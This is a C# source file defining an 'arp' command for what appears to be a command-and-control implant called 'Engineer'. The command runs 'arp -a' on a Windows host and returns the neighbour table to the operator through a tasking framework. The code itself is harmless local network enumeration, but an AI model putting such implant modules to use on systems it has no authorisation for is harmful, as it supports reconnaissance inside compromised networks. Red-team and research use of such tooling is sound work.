using Engineer.Commands;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class arp : EngineerCommand
    {
        public override string Name => "arp";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                //spawn the arp process and return the output
                var arpProcess = new System.Diagnostics.Process();
                arpProcess.StartInfo.FileName = "arp.exe";
                arpProcess.StartInfo.Arguments = "-a";
                arpProcess.StartInfo.UseShellExecute = false;
                arpProcess.StartInfo.RedirectStandardOutput = true;
                arpProcess.Start();
                var output = arpProcess.StandardOutput.ReadToEnd();
                arpProcess.WaitForExit();
                Tasking.FillTaskResults(output, task, EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception e)
            {
                Tasking.FillTaskResults(e.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
    }
}
